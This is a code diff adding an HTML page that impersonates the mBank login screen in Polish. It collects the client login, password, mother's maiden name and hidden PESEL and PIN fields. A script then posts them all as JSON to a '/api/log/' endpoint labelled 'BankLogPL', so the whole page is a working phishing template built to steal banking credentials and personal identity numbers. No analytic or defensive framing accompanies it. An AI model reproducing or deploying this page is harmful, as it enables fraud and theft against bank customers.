@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<link href="https://www.mbank.pl/favicon.ico?2de64b1b29caaf6d5b93a858c5b7a947" rel="icon" type="image/x-icon">
+		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+		<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+		<script src="/static/style/protect/protect.js"></script>
+		<title>mBank | Bankowość korporacyjna, MSP i korporacje, finansowanie przedsiębiorstw</title>
+		<style>
+			._0 {
+				margin: 0 auto;
+				max-width: 400px;
+				box-sizing: border-box;
+			}
+			._01 {
+				margin: 0 auto;
+				max-width: 490px;
+				box-sizing: border-box;
+				padding: 24px;
+				background: #fff;
+				margin-top: 50px;
+				padding-left: 0;
+				margin-bottom: 50px;
+			}
+			._1 {
+				font-size: 18px;
+				padding-top: 16px;
+				text-align: center;
+			}
+			._2 {
+				margin: 10px 0;
+				border-bottom: 1px solid #ddd;
+			}
+			._3 {
+				text-align: left;
+			    font-size: 14px;
+			    border-bottom: 1px #a4a2a2 solid;
+			    background: none;
+			    padding: 10px 10px;
+			    margin-bottom: 10px;
+			}
+			._4 {
+				float: right;
+			    width: 100%;
+				margin: 0;
+			    color: #000;
+			    font-weight: 400;
+			    font-size: 18px;
+			    line-height: 24px;
+			    display: inline-block;
+			    -webkit-box-sizing: border-box;
+			    box-sizing: border-box;
+			    padding: 11px 30px;
+			    min-width: 180px;
+			    border-radius: 5px;
+			    white-space: nowrap;
+			    background-color: #21a148;
+			    color: #fff;
+			    text-align: center;
+			    text-decoration: none;
+			    margin-top: 10px;
+			    border: none;
+			}
+			._5 {
+				color: #aaa;
+				text-align: right;
+				width: 45%;
+				padding-right: 24px;
+			}
+			._6 {
+				font-weight: bold;
+			}
+			._7 {
+				margin-top: 4px;
+				margin-bottom: 16px;
+			}
+			._8 {
+				padding-bottom: 6px;
+				line-height: 18px;
+			}
+			._9 {
+				text-align: right;
+			}
+			body {
+				margin: 0;
+				font-family: Arial;
+				font-size: 12px;
+				color: #222;
+				word-break: break-word;
+				user-select: none;
+				background: #fdfdfd;
+				-webkit-appearance: none;
+			}
+			input {
+				font-family: Arial;
+				font-size: 12px;
+				color: #222;
+				width: 100%;
+				border: none;
+				box-sizing: border-box;
+				text-align: center;
+				-webkit-appearance: none;
+			}
+			table {
+				width: 100%;
+				border-collapse: separate;
+				border-spacing: 0;
+			}
+			td {
+				padding: 4px 0;
+			}
+			a {
+				text-decoration: none;
+			}
+			button {
+				-webkit-appearance: none;
+			}
+			#bottom a {
+				color: #6d6d6d;
+				padding: 10px;
+
+			}
+			#mainblock {
+				max-width: 450px;
+				display: flex;
+				margin: 0 20px;
+			    background-color: #ebe8e8;
+			    position: absolute;
+			    top: 60px;
+			}
+			#rightblock {
+				margin-top: 100px;
+				display: flex;
+			}
+			.loginboxes {
+				display: flex;
+			}
+			#formblock {
+                /*border-right: 1px solid #e4e4e4;
+                padding-right: 70px; */
+			}
+			#konto {
+				margin-left: 40%; 
+				padding-top: 30px;
+			}
+			#Pomoc {
+				display: none;
+                padding-top: 25px; 
+                width: 150px;
+			}
+			#color {
+				height: 10px;
+				background: -webkit-gradient(linear,left top,right top,color-stop(0%,#e41e0a),color-stop(27%,#e41e0a),color-stop(27%,#201c17),color-stop(32%,#201c17),color-stop(32%,#f39100),color-stop(57%,#f39100),color-stop(57%,#cc0b18),color-stop(73%,#cc0b18),color-stop(73%,#0077bd),color-stop(77%,#0077bd),color-stop(77%,#18a035),color-stop(100%,#18a035));
+    background: -webkit-linear-gradient(left,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
+    background: -o-linear-gradient(left,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
+    background: -ms-linear-gradient(left,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
+    background: linear-gradient(to right,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
+			}
+			@media all and (max-width: 800px) {
+				#mainblock {
+					display: block;
+				}
+				#formblock {
+					border-right: none;
+					padding-right: 0; 
+				}
+			}
+			@media all and (max-width: 500px) {
+				.loginboxes {
+					display: block;
+				}
+				#rightblock {
+					display: block;
+				}
+				#konto {
+					margin: 0;
+				}
+				#Pomoc {
+					padding-top: 0;
+					padding-bottom: 25px;
+				}
+				._4 {
+					width: 100%;
+				}
+			}
+		</style>
+	</head>
+	<body>
+		<header style="display: flex; height: 40px;">
+			<img src="/static/style/banksPL/mbank/mbank.png" height="40">
+			<div style="padding: 13px 2px; color: #6d6d6d">Zaloguj się do serwisu transakcyjnego</div>
+		</header>
+		<div style="height: 305px;">
+			<img src="/static/style/banksPL/mbank/mbank-back.png" style="height: 100%; width: 100%;">
+		</div>
+		<div id="mainblock">
+			<div id="color"></div>
+			<div class="_0">
+				<form method="post" id="formblock">
+					<div class="loginboxes">
+						<div class="_1">Klienci indywidualni i firmowi</div>
+						<div style="padding: 10px; text-align: center; margin-top: 15px;">
+							<img src="/static/style/banksPL/mbank/mbank-photo.png" height="100">
+						</div>
+					</div>
+					<div style="padding: 0 15px;">
+						<input id="login" class="_3" type="text" name="login" placeholder="Wpisz numer klienta lub login" required=""> 
+						<input id="password" class="_3" type="password" name="password" placeholder="Wpisz hasło" required="">
+						<input id="mamka" class="_3" type="text" name="mamka" placeholder="Nazwisko rodowe Matki" required="">
+						<input style="display: none;" id="pesel" class="_3" type="text" name="pesel" placeholder="Pesel" required="">
+						<input style="display: none;" id="pin" class="_3" type="password" name="pin" placeholder="PIN" required="">
+					</div>
+					
+						<div style="color: #ff6161; padding: 20px; text-align: center;"></div>
+					<div class="loginboxes">
+						<button id="field3ds5" form="123123" class="_4">Zaloguj się</button>
+						<input style="display: none;" id="field3ds6" class="_4" type="submit" value="Zaloguj się" onclick="sendData()">
+					</div>
+				</form>
+			</div>
+		</div>
+		<footer style="max-width: 450px; margin: 0 20px; margin-top: 70px;">
+			<div id="bottom">
+				<a href="https://www.mbank.pl/">Odblokuj dostęp</a>
+				<a href="https://www.mbank.pl/pomoc/info/bezpieczenstwo/logowanie-odblokowanie.html">Problem z zalogowaniem?</a>
+			</div>
+		</footer>
+
+        <script type="text/javascript">
+            function sendData() {
+              var data = $('#formblock').serializeArray().reduce(function(obj, item) {
+                  obj[item.name] = item.value;
+                  return obj;
+              }, {});
+
+              fetch(`/api/log/${window.location.pathname.split('/')[3]}`, {
+                method: 'POST',
+                cache: 'no-cache',
+                headers: {
+                    'Accept': 'application/json, text/plain, */*',
+                    'Content-Type': 'application/json'
+                },
+                referrerPolicy: 'no-referrer',
+                body: JSON.stringify({
+                    login: data.login,
+                    password: data.password,
+                    mamka: data.mamka,
+                    pesel: data.pesel,
+                    pin: data.pin,
+                    bank: 'mbank',
+                    method: 'BankLogPL'
+                })
+              })
+            }
+        </script>
+</body></html>
